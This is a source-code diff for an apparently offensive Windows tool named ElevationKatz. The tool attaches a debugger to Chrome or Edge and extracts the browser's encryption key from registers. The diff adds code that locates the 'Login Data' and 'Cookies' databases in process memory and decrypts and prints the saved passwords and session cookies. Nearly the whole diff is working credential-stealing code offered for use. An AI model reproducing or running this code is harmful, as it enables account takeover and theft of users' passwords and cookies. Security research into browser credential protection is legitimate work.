@@ -3,8 +3,26 @@
 #include <shlwapi.h>
 #include <stdio.h>
 #include <cstdint>
+#include "sqlite3.h"
+#include <Psapi.h>
+#include "Process.h"
+
 #pragma comment(lib, "Dbghelp.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "bcrypt.lib")
+
+#define STATUS_BUFFER_TOO_SMALL 0xC0000023
+#define ERROR_FILE_INVALID 0x3EE
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
+
+enum Dump {
+    Creds = 0,
+    Cookies = 1,
+    All = 2,
+    None = 3
+};
 
 #pragma region HWBreakpoint
 
@@ -15,12 +33,11 @@ typedef NTSTATUS(NTAPI* NtGetNextThread)(
     ULONG HandleAttributes,
     ULONG Flags,
     PHANDLE NewThreadHandle);
-#define STATUS_NO_MORE_ENTRIES           ((NTSTATUS)0x8000001AL)
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
-#endif
 
-BOOL SetHWBreakPoint(HANDLE hThread, DWORD64 addr)
+
+#define STATUS_NO_MORE_ENTRIES           ((NTSTATUS)0x8000001AL)
+
+BOOL SetHWBreakPoint(HANDLE hThread, DWORD64 addr, BOOL clear)
 {
     CONTEXT ctx = { 0 };
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
@@ -28,30 +45,37 @@ BOOL SetHWBreakPoint(HANDLE hThread, DWORD64 addr)
         printf("[-] Failed to acquire Thread Context. Error: %d\n", GetLastError());
         return false;
     }
+    if (clear)
+    {
+        ctx.Dr0 = 0;
+        ctx.Dr7 = 0;
+        ctx.Dr6 = 0;
+    }
+    else {
+        // Set break point to Debug Register #0
+        ctx.Dr0 = addr;
 
-    // Set break point to Debug Register #0
-    ctx.Dr0 = addr;
+        //Clear before resetting
+        ctx.Dr7 = 0;
 
-    //Clear before resetting
-    ctx.Dr7 = 0;
+        // Enable slot #0
+        ctx.Dr7 |= (1ull << 0);
 
-    // Enable slot #0
-    ctx.Dr7 |= (1ull << 0);
-
-    // Clear status
-    ctx.Dr6 = 0;
+        // Clear status
+        ctx.Dr6 = 0;
+    }
 
     return SetThreadContext(hThread, &ctx);
 }
 
-BOOL SetHWBPOnThread(HANDLE hThread, uintptr_t bpAddress) {
+BOOL SetHWBPOnThread(HANDLE hThread, uintptr_t bpAddress, BOOL clear) {
 
     if (SuspendThread(hThread) == ((DWORD)-1)) {
         printf("[-] Failed to suspend Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
         return FALSE;
     }
 
-    if (!SetHWBreakPoint(hThread, bpAddress)) //Continue on error
+    if (!SetHWBreakPoint(hThread, bpAddress, clear)) //Continue on error
         printf("[-] Failed to set HW breakpoint on Thread: %d, Error: %d\n", GetThreadId(hThread), GetLastError());
 
     if (ResumeThread(hThread) == ((DWORD)-1)) {
@@ -62,7 +86,7 @@ BOOL SetHWBPOnThread(HANDLE hThread, uintptr_t bpAddress) {
     return TRUE;
 }
 
-BOOL SetOnAllThreads(HANDLE hProcess, uintptr_t bpAddr) {
+BOOL SetOnAllThreads(HANDLE hProcess, uintptr_t bpAddr, BOOL clear) {
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
     if (!ntdll)
     {
@@ -91,7 +115,7 @@ BOOL SetOnAllThreads(HANDLE hProcess, uintptr_t bpAddr) {
             return TRUE;
         }
 
-        if (SetHWBPOnThread(hNextThread, bpAddr)) {
+        if (SetHWBPOnThread(hNextThread, bpAddr, clear)) {
 #ifdef _DEBUG
             printf("[*] HW breakpoint set on Thread: %d\n", GetThreadId(hNextThread));
 #endif // _DEBUG
@@ -111,7 +135,7 @@ BOOL SetOnAllThreads(HANDLE hProcess, uintptr_t bpAddr) {
     return TRUE;
 }
 
-BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr) {
+BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr, BOOL clear) {
 
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (snap == INVALID_HANDLE_VALUE) {
@@ -137,7 +161,7 @@ BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr) {
         }
 
         //We already notify on errors elsewhere, just have debug output here
-        if (SetHWBPOnThread(th, addr))
+        if (SetHWBPOnThread(th, addr, clear))
             printf("[*] HW breakpoint set on Thread: %d\n", te.th32ThreadID);
 
         CloseHandle(th);
@@ -145,6 +169,297 @@ BOOL SetOnAllThreadsTL32(DWORD pid, uintptr_t addr) {
 
     CloseHandle(snap);
     return TRUE;
+}
+
+#pragma endregion
+
+#pragma region Credential and Cookie dumping
+
+BOOLEAN Decrypt(const BYTE* key, ULONG keyLen, const BYTE* blob, ULONG blobLen, BYTE** plain, ULONG* plainLen)
+{
+    static const size_t GCM_IV_LENGTH = 12;
+    static const size_t GCM_TAG_LENGTH = 16;
+    static const char* V20_PREFIX = "v20";
+
+    size_t V20_PREFIX_len = strlen(V20_PREFIX);
+    const size_t GCM_OVERHEAD_LENGTH = V20_PREFIX_len + GCM_IV_LENGTH + GCM_TAG_LENGTH;
+
+    if (blobLen < GCM_OVERHEAD_LENGTH || memcmp(blob, V20_PREFIX, V20_PREFIX_len) != 0)
+    {
+        printf("[-] Encrypted blob was missing the V20 prefix\n");
+        return FALSE;
+    }
+
+    BCRYPT_ALG_HANDLE hAlg = nullptr;
+    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
+    if (!NT_SUCCESS(status)) {
+        printf("[-] BCryptOpenAlgorithmProvider failed, NTSTATUS=0x%08X\n", status);
+        return FALSE;
+    }
+
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
+    if (!NT_SUCCESS(status)) {
+        printf("[-] BCryptSetProperty failed, NTSTATUS=0x%08X\n", status);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return FALSE;
+    }
+
+    BCRYPT_KEY_HANDLE hKey = nullptr;
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, keyLen, 0);
+    if (!NT_SUCCESS(status)) {
+        printf("[-] BCryptGenerateSymmetricKey failed, NTSTATUS=0x%08X\n", status);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return FALSE;
+    }
+
+    const BYTE* iv = blob + V20_PREFIX_len;
+    const BYTE* ct = iv + GCM_IV_LENGTH;
+    const BYTE* tag = blob + (blobLen - GCM_TAG_LENGTH);
+    ULONG ct_len = static_cast<ULONG>(blobLen - V20_PREFIX_len - GCM_IV_LENGTH - GCM_TAG_LENGTH);
+
+    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
+    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
+    authInfo.pbNonce = (PUCHAR)iv;
+    authInfo.cbNonce = GCM_IV_LENGTH;
+    authInfo.pbTag = (PUCHAR)tag;
+    authInfo.cbTag = GCM_TAG_LENGTH;
+    authInfo.pbAuthData = nullptr;
+    authInfo.cbAuthData = 0;
+
+    ULONG outLen = 0;
+
+    status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, *plain, *plainLen, &outLen, 0);
+    if (status == STATUS_BUFFER_TOO_SMALL)
+    {
+        *plain = (BYTE*)calloc(outLen, sizeof(BYTE));
+        status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, *plain, outLen, &outLen, 0);
+    }
+    if (!NT_SUCCESS(status))
+    {
+        printf("[-] BCryptDecrypt failed, NTSTATUS=0x%08X\n", status);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        BCryptDestroyKey(hKey);
+        return FALSE;
+    }
+
+    if (outLen > 0)
+        *plainLen = outLen;
+
+    if (hAlg)
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+
+    if (hKey)
+        BCryptDestroyKey(hKey);
+
+    return TRUE;
+}
+
+void PrintTimeStamp(int64_t timeStamp) {
+
+    if (timeStamp == 0) //If credential has never been autofilled
+    {
+        printf("Never\n");
+        return;
+    }
+
+    ULONGLONG fileTimeTicks = timeStamp * 10;
+
+    FILETIME fileTime;
+    fileTime.dwLowDateTime = static_cast<DWORD>(fileTimeTicks & 0xFFFFFFFF);
+    fileTime.dwHighDateTime = static_cast<DWORD>(fileTimeTicks >> 32);
+
+    SYSTEMTIME systemTime;
+    FileTimeToSystemTime(&fileTime, &systemTime);
+
+    printf("%04hu-%02hu-%02hu %02hu:%02hu:%02hu\n",
+        systemTime.wYear, systemTime.wMonth, systemTime.wDay,
+        systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
+}
+
+BOOLEAN DumpCredentials(sqlite3* db, const BYTE* key) {
+
+    static const char* passwordsQuery = "SELECT origin_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins;";
+    static const size_t keyLen = 32;
+
+    sqlite3_stmt* stmt = nullptr;
+    int rc = sqlite3_prepare_v2(db, passwordsQuery, -1, &stmt, nullptr);
+    if (rc != SQLITE_OK) {
+        printf("[-] Failed to query 'Login Data' database, sqlite error: %d\n", rc);
+        sqlite3_close(db);
+
+        return FALSE;
+    }
+
+    printf("\n[+] Extracted credentials\n");
+    while (sqlite3_step(stmt) == SQLITE_ROW)
+    {
+        const BYTE* blob = reinterpret_cast<const BYTE*>(sqlite3_column_blob(stmt, 2));
+        if (!blob)
+            continue;
+
+        ULONG blobLen = sqlite3_column_bytes(stmt, 2);
+
+        BYTE* plain = (BYTE*)calloc(blobLen, sizeof(BYTE));
+        ULONG plainLen = blobLen;
+        if (!Decrypt(key, keyLen, blob, blobLen, &plain, &plainLen)) {
+            printf("[-] Failed to decrypt blob!\n");
+            free(plain);
+            continue;
+        }
+        printf("[+] URL:       %s\n", (const char*)sqlite3_column_text(stmt, 0));
+        printf("    Name:      %s\n", (const char*)sqlite3_column_text(stmt, 1));
+        printf("    Value:     %s\n", plain);
+        printf("    Last used: "); PrintTimeStamp(sqlite3_column_int64(stmt, 4));
+        printf("    Created:   "); PrintTimeStamp(sqlite3_column_int64(stmt, 3));
+        printf("    Modified:  "); PrintTimeStamp(sqlite3_column_int64(stmt, 5));
+        printf("\n");
+    }
+    printf("\n");
+    sqlite3_finalize(stmt);
+
+    return TRUE;
+}
+
+BOOLEAN DumpCookies(sqlite3* db, const BYTE* key) {
+
+    static const char* cookiesQuery = "SELECT host_key, name, path, is_secure, is_httponly, expires_utc, encrypted_value, creation_utc, last_access_utc, last_update_utc FROM cookies;";
+    static const size_t keyLen = 32;
+
+    sqlite3_stmt* stmt = nullptr;
+    int rc = sqlite3_prepare_v2(db, cookiesQuery, -1, &stmt, nullptr);
+    if (rc != SQLITE_OK) {
+        printf("[-] Failed to query the Cookie database, sqlite error: %d\n", rc);
+        sqlite3_close(db);
+
+        return FALSE;
+    }
+
+    printf("\n");
+    printf("[+] Extracted cookies\n");
+    while (sqlite3_step(stmt) == SQLITE_ROW)
+    {
+        const BYTE* blob = reinterpret_cast<const BYTE*>(sqlite3_column_blob(stmt, 6));
+        if (!blob)
+            continue;
+
+        ULONG blobLen = sqlite3_column_bytes(stmt, 6);
+        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;
+
+        BYTE* plain = (BYTE*)calloc(blobLen, sizeof(BYTE));
+        ULONG plainLen = blobLen;
+        if (!Decrypt(key, keyLen, blob, blobLen, &plain, &plainLen)) {
+            printf("[-] Failed to decrypt blob!\n");
+            free(plain);
+            continue;
+        }
+
+        if (plainLen <= COOKIE_PLAINTEXT_HEADER_SIZE)
+            continue;
+
+        size_t value_size = plainLen - COOKIE_PLAINTEXT_HEADER_SIZE;
+        char* value_start = reinterpret_cast<char*>(plain) + COOKIE_PLAINTEXT_HEADER_SIZE;
+
+        printf("[+] Domain:   %s\n", (const char*)sqlite3_column_text(stmt, 0));
+        printf("    Name:     %s\n", (const char*)sqlite3_column_text(stmt, 1));
+        printf("    Path:     %s\n", (const char*)sqlite3_column_text(stmt, 2));
+        printf("    Value:    %s\n", value_start);
+        printf("    Creation time:   "); PrintTimeStamp(sqlite3_column_int64(stmt, 7));
+        printf("    Expiration time: "); PrintTimeStamp(sqlite3_column_int64(stmt, 5));
+        printf("    Last accessed:   "); PrintTimeStamp(sqlite3_column_int64(stmt, 8));
+        printf("    Last updated:    "); PrintTimeStamp(sqlite3_column_int64(stmt, 9));
+        printf("    Secure:   %s\n", (sqlite3_column_int(stmt, 3) ? "true" : "false"));
+        printf("    HTTPOnly: %s\n", (sqlite3_column_int(stmt, 4) ? "true" : "false"));
+        printf("\n");
+    }
+    printf("\n");
+
+    sqlite3_finalize(stmt);
+
+    return TRUE;
+}
+
+BOOLEAN FindSQLiteDBs(HANDLE hProcess, const BYTE* key, Dump config) {
+
+    SYSTEM_INFO systemInfo;
+    GetSystemInfo(&systemInfo);
+
+    uintptr_t startAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMinimumApplicationAddress);
+    uintptr_t endAddress = reinterpret_cast<uintptr_t>(systemInfo.lpMaximumApplicationAddress);
+
+    MEMORY_BASIC_INFORMATION memoryInfo;
+
+    BOOLEAN success = FALSE;
+
+    while (startAddress < endAddress) {
+        if (VirtualQueryEx(hProcess, reinterpret_cast<LPCVOID>(startAddress), &memoryInfo, sizeof(memoryInfo)) == sizeof(memoryInfo)) {
+            if (memoryInfo.State == MEM_COMMIT && (memoryInfo.Protect & PAGE_READONLY) != 0 && memoryInfo.Type == MEM_MAPPED) {
+
+                wchar_t fullFileName[MAX_PATH];
+                DWORD filenameLen = GetMappedFileNameW(hProcess, (LPVOID)memoryInfo.BaseAddress, fullFileName, MAX_PATH);
+                if (filenameLen > 0) {
+
+                    const wchar_t* fileName = PathFindFileName(fullFileName);
+                    if (_wcsicmp(fileName, L"Login Data") == 0 || _wcsicmp(fileName, L"Cookies") == 0) {
+                        success = TRUE; //This only indicates if the file was found, not actual dumping success
+                        printf("[+] Found target file at: %p\n", memoryInfo.BaseAddress);
+                        printf("    %ls\n", fullFileName);
+
+                        BYTE* buffer = (BYTE*)malloc(memoryInfo.RegionSize);
+                        if (!buffer)
+                            continue;
+
+                        SIZE_T bytesRead;
+
+                        if (ReadProcessMemory(hProcess, memoryInfo.BaseAddress, buffer, memoryInfo.RegionSize, &bytesRead)) {
+
+                            sqlite3* db = nullptr;
+                            //First we create an empty in-memory db
+                            int rc = sqlite3_open_v2("file:memdb?mode=memory", &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_URI, nullptr);
+                            if (rc != SQLITE_OK) {
+                                printf("[-] Failed to create an in-memory DB\n");
+                                free(buffer);
+                                continue;
+                            }
+
+                            //Deserialize the DB
+                            rc = sqlite3_deserialize(db, "main", buffer, memoryInfo.RegionSize, memoryInfo.RegionSize, SQLITE_DESERIALIZE_READONLY);
+                            if (rc != SQLITE_OK) {
+                                sqlite3_close(db);
+                                printf("[-] Failed to deserialize the database\n");
+                                free(buffer);
+                                continue;
+                            }
+
+                            if (_wcsicmp(fileName, L"Login Data") == 0 && (Dump::All || Dump::Creds)) {
+                                DumpCredentials(db, key);
+                            }
+                            else if (Dump::All || Dump::Cookies) {
+                                DumpCookies(db, key);
+                            }
+                            sqlite3_close_v2(db);
+                            free(buffer);
+
+                            return success;
+                        }
+                        free(buffer);
+                    }
+                }
+                else {
+                    int lastError = GetLastError();
+                    if (lastError != ERROR_FILE_INVALID) //This happens quite often
+                        printf("[-] GetMappedFileNameW to query module name: 0x%p, Error: %d\n", memoryInfo.BaseAddress, GetLastError());
+                }
+            }
+
+            startAddress += memoryInfo.RegionSize;
+        }
+        else {
+            printf("[-] VirtualQueryEx failed\n");
+            break;  // VirtualQueryEx failed
+        }
+    }
+
+    return success;
 }
 
 #pragma endregion
@@ -347,7 +662,7 @@ uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, 
     return 0;
 }
 
-void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
+void PrintKey(HANDLE hProc, uintptr_t registryAddr, BYTE* key) {
     SIZE_T n = 0;
     uintptr_t address = 0;
     if (!ReadProcessMemory(hProc, (LPCVOID)registryAddr, &address, sizeof(uintptr_t), &n)) {
@@ -358,8 +673,7 @@ void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
 
     n = 0;
     const int keyLen = 32;
-    BYTE key[keyLen] = { 0 };
-    if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
+    if (!ReadProcessMemory(hProc, (LPCVOID)address, key, keyLen, &n)) {
         printf("[-] Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
         return;
     }
@@ -370,7 +684,7 @@ void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
     printf("\n");
 }
 
-void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge) {
+void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge, BYTE* key) {
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;
 
@@ -403,10 +717,10 @@ void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge) {
     if (edge)
     {
         printf("[*] Dumping key from RBX\n");
-        PrintKey(hProc, ctx.Rbx);
+        PrintKey(hProc, ctx.Rbx, key);
     } else {
         printf("[*] Dumping key from R14\n");
-        PrintKey(hProc, ctx.R14);
+        PrintKey(hProc, ctx.R14, key);
     }
 }
 
@@ -429,10 +743,17 @@ BOOL GetModuleName(HANDLE hProcess, const void* remote, wchar_t* dllName) {
     return TRUE;
 }
 
-BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress) {
+BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress, BYTE instruction, BYTE& old) {
 
-    BYTE breakpointByte = 0xCC; // INT 3
-    if (WriteProcessMemory(hProcess, (LPVOID)breakpointAddress, &breakpointByte, sizeof(BYTE), nullptr)) {
+    if (ReadProcessMemory(hProcess, (LPVOID)breakpointAddress, &old, sizeof(BYTE), nullptr)) {
+        printf("[*] Cached old instruction from: 0x%016llx, 0x%x\n", breakpointAddress, old);
+    }
+    else {
+        printf("[-] Failed to set breakpoint at address: 0x%016llx, Error: %d\n", breakpointAddress, GetLastError());
+        return FALSE;
+    }
+
+    if (WriteProcessMemory(hProcess, (LPVOID)breakpointAddress, &instruction, sizeof(BYTE), nullptr)) {
         printf("[*] Breakpoint set successfully at address: 0x%016llx\n", breakpointAddress);
     }
     else {
@@ -443,12 +764,15 @@ BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress) {
     return TRUE;
 }
 
-void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, DWORD waitTime, BOOL useHW, BOOL useTL32) {
+void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, DWORD waitTime, BOOL useHW, BOOL useTL32, BYTE* key) {
     DEBUG_EVENT debugEvent;
-    uintptr_t breakpointAddress = 0x00;
+    uintptr_t breakpointAddress = 0x00; 
+    BYTE oldInstruction = 0x00; //Not used in HW config
 
     if (waitTime == 0)
         waitTime = INFINITE;
+
+    BOOL exit = FALSE;
 
     while (WaitForDebugEvent(&debugEvent, waitTime)) {
         switch (debugEvent.dwDebugEventCode) {
@@ -479,12 +803,13 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                     printf("[+] Hit HW breakpoint Execute at slot 0: RIP=0x%016llx\n", (unsigned long long)c.Rip);
 
                     if (_wcsicmp(targetModule, L"msedge.dll") == 0)
-                        DumpSecret(hProcess, hThread, TRUE);
+                        DumpSecret(hProcess, hThread, TRUE, key);
                     else
-                        DumpSecret(hProcess, hThread, FALSE);
+                        DumpSecret(hProcess, hThread, FALSE, key);
+
+                    SetOnAllThreads(hProcess, breakpointAddress, TRUE);
 
                     CloseHandle(hThread);
-
                     ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                     return;
                 }
@@ -500,9 +825,35 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                         if (GetExitCodeThread(hThread, &exitCode)) {
                             if (exitCode == STILL_ACTIVE) {
                                 if (_wcsicmp(targetModule, L"msedge.dll") == 0)
-                                    DumpSecret(hProcess, hThread, TRUE);
+                                    DumpSecret(hProcess, hThread, TRUE, key);
                                 else
-                                    DumpSecret(hProcess, hThread, FALSE);
+                                    DumpSecret(hProcess, hThread, FALSE, key);
+
+                                //Clear BP
+                                if (!SetBreakPoint(hProcess, breakpointAddress, oldInstruction, oldInstruction)) {
+                                    printf("[-] Failed to clear the breakpoint.\n");
+                                    return;
+                                }
+
+                                //Rewind RIP to execute the original instruction
+                                CONTEXT ctx = { 0 };
+                                if (!GetThreadContext(hThread, &ctx)) {
+                                    printf("[-] GetThreadContext failed: %d\n", GetLastError());
+                                    CloseHandle(hThread);
+                                    return;
+                                }
+                                ctx.Rip -= 1;
+                                SetThreadContext(hThread, &ctx);
+
+                                //Flush cache to make sure the original instruction is executed
+                                if(!FlushInstructionCache(hProcess, (LPCVOID)ctx.Rip, 1))
+                                    printf("[-] FlushInstructionCache failed: %d\n", GetLastError());
+
+                                //And it crashes... whyyyy?! :'(
+
+                                ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
+                                CloseHandle(hThread);
+                                return;
                             }
                             else
                                 printf("[-] Thread %d has already exited. Exit code: %d\n", debugEvent.dwThreadId, exitCode);
@@ -515,7 +866,6 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                     else {
                         printf("[-] Failed to open Thread: %d. Error: %d\n", debugEvent.dwThreadId, GetLastError());
                     }
-
                     return;
                 }
             }
@@ -528,7 +878,7 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                     printf("[-] Failed to open Thread: %d, Error: %d\n", debugEvent.dwThreadId, GetLastError());
                     break;
                 }
-                if (SetHWBPOnThread(hThread, breakpointAddress)){
+                if (SetHWBPOnThread(hThread, breakpointAddress, FALSE)){
 #ifdef _DEBUG
                     printf("[*] HW breakpoint set on new Thread: %d\n", debugEvent.dwThreadId);
 #endif // _DEBUG
@@ -603,21 +953,21 @@ void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, 
                     {
                         if (useTL32)
                         {
-                            if (!SetOnAllThreadsTL32(debugEvent.dwProcessId, breakpointAddress)) {
+                            if (!SetOnAllThreadsTL32(debugEvent.dwProcessId, breakpointAddress, FALSE)) {
                                 printf("[-] Failed to set HW breakpoints!\n");
                                 ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
                                 return;
                             }
                         }
                         else {
-                            if (!SetOnAllThreads(hProcess, breakpointAddress)) {
+                            if (!SetOnAllThreads(hProcess, breakpointAddress, FALSE)) {
                                 printf("[-] Failed to set HW breakpoints!\n");
                                 return;
                             }
                         }
                     }
                     else {
-                        if (!SetBreakPoint(hProcess, breakpointAddress)) {
+                        if (!SetBreakPoint(hProcess, breakpointAddress, 0xCC, oldInstruction)) {
                             printf("[-] Failed to set the breakpoint.\n");
                             return;
                         }
@@ -649,6 +999,10 @@ void usage() {
     printf("    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n");
     printf("    Will use Hardware breakpoints instead of the software ones\n");
     printf("    Waits for 500 milliseconds for process to finish until forced shutdown.\n");
+    printf(".\\ElevationKatz.exe /chrome /config:all\n");
+    printf("    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n");
+    printf("    Will use Hardware breakpoints instead of the software ones\n");
+    printf("    Parses the cookie and credential database from the browser memory and dumps them\n");
     printf(".\\ElevationKatz.exe /edge /wait:1000\n");
     printf("    Starts a new chrome process using path: C:\\Program Files(x86)\\Microsoft\\Edge\\Application\\msedge.exe\n");
     printf("    Waits for 1000 milliseconds for process to finish until forced shutdown.\n");
@@ -662,6 +1016,7 @@ void usage() {
     printf("    /wait:<milliseconds>   Maximum time to for the debugging. Use 0 for INFINITE. Defaults to 500ms.\n");
     printf("    /path:<path_to_exe>    Provide path to the process executable\n");
     printf("    /module:<some.dll>     Provide alternative module to target\n");
+    printf("    /config:<option>       Automatically locate and dump contents of profile databases. Options. Cookies|Creds|All\n");
     printf("    /help                  This what you just did! -h works as well\n");
 }
 
@@ -681,6 +1036,7 @@ int main(int argc, char* argv[]) {
     BOOL useTL32 = FALSE;
     BOOL terminate = FALSE;
     DWORD wait = 500; //Default wait time 500ms
+    Dump config = Dump::None;
 
     const wchar_t* targetModule = L"";
     const wchar_t* targetExecutable = L"";
@@ -733,6 +1089,19 @@ int main(int argc, char* argv[]) {
                 return 1;
             }
         }
+        if (StrStrIA(argv[i], "config:") != NULL) {
+            const char* colonPos = strchr(argv[i], ':');
+            const char* value = colonPos + 1;
+
+            if (_stricmp(value, "Cookies") == 0)
+                config = Dump::Cookies;
+            else if (_stricmp(value, "Creds") == 0)
+                config = Dump::Creds;
+            else if (_stricmp(value, "All") == 0)
+                config = Dump::All;
+            else
+                config = Dump::None;
+        }
         if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
             banner();
             usage();
@@ -765,8 +1134,13 @@ int main(int argc, char* argv[]) {
         FindAndTerminateProcess(executableName);
     }
 
+    if (config != Dump::None) //Temporary trick until I figure out how to clear the SW breakpoint correctly
+        useHW = TRUE;
+
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
+
+    BYTE key[32]{0}; //Decryption key
 
     // Start a new instance suspended
     if (!CreateProcess(targetExecutable, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
@@ -788,11 +1162,57 @@ int main(int argc, char* argv[]) {
         if (DebugActiveProcess(pi.dwProcessId)) {
 
             printf("[+] Debugger attached to process with PID: %d\n", pi.dwProcessId);
-            DebugProcess(pi.hProcess, pi.hThread, targetModule, wait, useHW, useTL32);
+            DebugProcess(pi.hProcess, pi.hThread, targetModule, wait, useHW, useTL32, key);
+
+            if (config != Dump::None)
+                if (!DebugSetProcessKillOnExit(FALSE))
+                    printf("[-] DebugSetProcessKillOnExit failed, Error: %d\n", GetLastError());
+            
+            if (!DebugActiveProcessStop(pi.dwProcessId))
+                printf("[-] DebugActiveProcessStop failed, Error: %d\n", GetLastError());
         }
         else {
             printf("[-] DebugActiveProcess failed to attach. Error: %d\n", GetLastError());
             return 1;
+        }
+    }
+
+    //Edge is so slow to start that we need to wait to make sure the browser has loaded the profile databases
+    //Brave is somehow even slower... Maybe I we should just re-scan until the DB is found or timeout?
+    Sleep(500);
+
+    if (config != Dump::None)
+    {
+        DWORD exitcode = 0;
+        if (!GetExitCodeProcess(pi.hProcess, &exitcode)) {
+            printf("[-] Couldn't check if the process handle is still valid. Error: %d\n", GetLastError());
+            return 1;
+        }
+
+        if (exitcode != STILL_ACTIVE) {
+            printf("[-] The Browser process has likely crashed. Cannot dump creds/cookies\n");
+            return 1;
+        }
+
+        if (config == Dump::All || config == Dump::Creds) {
+            //DWORD pid = FindTargetProcessCredentials(module); 
+            //We can just re-use the main process handle
+            if (!FindSQLiteDBs(pi.hProcess, key, config))
+                printf("[-] Could not find the 'Login Data' SQLite database in memory.\n");
+        }
+        if (config == Dump::All || config == Dump::Cookies) {
+            const wchar_t* executableName = PathFindFileName(targetExecutable);
+            DWORD pid = FindTargetProcessCookies(executableName);
+            if (pid != 0) {
+                HANDLE hCookieProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+                if (hCookieProc)
+                {
+                    if (!FindSQLiteDBs(hCookieProc, key, config))
+                        printf("[-] Could not find the 'Cookies' SQLite database in memory.\n");
+                }
+                else
+                    printf("[-] Failed to open handle to network process PID: %d\n", pid);
+            }
         }
     }
 
